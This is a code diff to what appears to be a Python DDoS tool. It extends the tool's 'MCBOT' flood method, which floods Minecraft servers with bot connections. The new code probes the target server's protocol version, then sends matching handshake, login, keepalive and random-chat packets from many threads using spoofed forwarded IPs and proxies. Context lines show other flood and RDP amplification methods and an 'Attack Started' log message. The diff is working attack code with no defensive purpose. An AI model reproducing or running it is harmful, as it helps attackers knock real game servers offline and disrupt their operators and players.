@@ -129,6 +129,7 @@ BYTES_SEND = Counter()
 
 class Tools:
     IP = compile("(?:\d{1,3}\.){3}\d{1,3}")
+    protocolRex = compile('"protocol":(\d+)')
 
     @staticmethod
     def humanbytes(i: int, binary: bool = False, precision: int = 2):
@@ -268,6 +269,10 @@ class Minecraft:
         return data_pack('>H', integer)
 
     @staticmethod
+    def long(integer: int) -> bytes:
+        return data_pack('>q', integer)
+
+    @staticmethod
     def handshake(target: Tuple[str, int], version: int, state: int) -> bytes:
         return Minecraft.data(Minecraft.varint(0x00),
                               Minecraft.varint(version),
@@ -290,20 +295,41 @@ class Minecraft:
                               Minecraft.varint(state))
 
     @staticmethod
-    def login(username: str) -> bytes:
+    def login(protocol: int, username: str) -> bytes:
         if isinstance(username, str):
             username = username.encode()
-        return Minecraft.data(Minecraft.varint(0x00),
+        return Minecraft.data(Minecraft.varint(0x00 if protocol >= 391 else \
+                                               0x01 if protocol >= 385 else \
+                                               0x00),
                               Minecraft.data(username))
 
     @staticmethod
-    def keepalive(num_id: int) -> bytes:
-        return Minecraft.data(Minecraft.varint(0x00),
+    def keepalive(protocol: int, num_id: int) -> bytes:
+        return Minecraft.data(Minecraft.varint(0x0F if protocol >= 755 else \
+                                               0x10 if protocol >= 712 else \
+                                               0x0F if protocol >= 471 else \
+                                               0x10 if protocol >= 464 else \
+                                               0x0E if protocol >= 389 else \
+                                               0x0C if protocol >= 386 else \
+                                               0x0B if protocol >= 345 else \
+                                               0x0A if protocol >= 343 else \
+                                               0x0B if protocol >= 336 else \
+                                               0x0C if protocol >= 318 else \
+                                               0x0B if protocol >= 107 else \
+                                               0x00),
+                              Minecraft.long(num_id) if protocol >= 339 else \
                               Minecraft.varint(num_id))
 
     @staticmethod
-    def chat(message: str) -> bytes:
-        return Minecraft.data(Minecraft.varint(0x01),
+    def chat(protocol: int, message: str) -> bytes:
+        return Minecraft.data(Minecraft.varint(0x03 if protocol >= 755 else \
+                                               0x03 if protocol >= 464 else \
+                                               0x02 if protocol >= 389 else \
+                                               0x01 if protocol >= 343 else \
+                                               0x02 if protocol >= 336 else \
+                                               0x03 if protocol >= 318 else \
+                                               0x02 if protocol >= 107 else \
+                                               0x01),
                               Minecraft.data(message.encode()))
 
 
@@ -321,11 +347,13 @@ class Layer4(Thread):
                  ref: List[str] = None,
                  method: str = "TCP",
                  synevent: Event = None,
-                 proxies: Set[Proxy] = None):
+                 proxies: Set[Proxy] = None,
+                 protocolid: int = 74):
         Thread.__init__(self, daemon=True)
         self._amp_payload = None
         self._amp_payloads = cycle([])
         self._ref = ref
+        self.protocolid = protocolid
         self._method = method
         self._target = target
         self._synevent = synevent
@@ -368,6 +396,7 @@ class Layer4(Thread):
         if name == "CPS": self.SENT_FLOOD = self.CPS
         if name == "CONNECTION": self.SENT_FLOOD = self.CONNECTION
         if name == "MCBOT": self.SENT_FLOOD = self.MCBOT
+
         if name == "RDP":
             self._amp_payload = (
                 b'\x00\x00\x00\x00\x00\x00\x00\xff\x00\x00\x00\x00\x00\x00\x00\x00',
@@ -480,20 +509,21 @@ class Layer4(Thread):
         s = None
         with suppress(Exception), self.open_connection(AF_INET, SOCK_STREAM) as s:
             Tools.send(s, Minecraft.handshake_forwarded(self._target,
-                                                        47,
+                                                        self.protocolid,
                                                         2,
                                                         ProxyTools.Random.rand_ipv4(),
                                                         uuid4()))
-            Tools.send(s, Minecraft.login(f"{con['MCBOT']}{ProxyTools.Random.rand_str(5)}"))
+
+            Tools.send(s, Minecraft.login(self.protocolid, f"{con['MCBOT']}{ProxyTools.Random.rand_str(5)}"))
             sleep(1.5)
 
             c = 360
-            while Tools.send(s, Minecraft.keepalive(ProxyTools.Random.rand_int(1111111, 9999999))):
+            while Tools.send(s, Minecraft.keepalive(self.protocolid, ProxyTools.Random.rand_int(1111111, 9999999))):
                 c -= 1
                 if c:
                     continue
                 c = 360
-                Tools.send(s, Minecraft.chat(Tools.randchr(100)))
+                Tools.send(s, Minecraft.chat(self.protocolid, Tools.randchr(100)))
         Tools.safe_close(s)
 
     def VSE(self) -> None:
@@ -1630,9 +1660,20 @@ if __name__ == '__main__':
 
                         else:
                             logger.setLevel("DEBUG")
+                
+                protocolid = 74
+                
+                if method == "MCBOT":
+                    with suppress(Exception), socket(AF_INET, SOCK_STREAM) as s:
+                        Tools.send(s, Minecraft.handshake(target, protocolid, 1))
+                        Tools.send(s, Minecraft.data(b'\x00'))
+
+                        protocolid = Tools.protocolRex.search(str(s.recv(256)))
+                        protocolid = 74 if not protocolid else int(protocolid.group(1))
+
                 for _ in range(threads):
                     Layer4((target, port), ref, method, event,
-                           proxies).start()
+                           proxies, protocolid).start()
 
             logger.info(
                 f"{bcolors.WARNING}Attack Started to{bcolors.OKBLUE} %s{bcolors.WARNING} with{bcolors.OKBLUE} %s{bcolors.WARNING} method for{bcolors.OKBLUE} %s{bcolors.WARNING} seconds, threads:{bcolors.OKBLUE} %d{bcolors.WARNING}!{bcolors.RESET}"
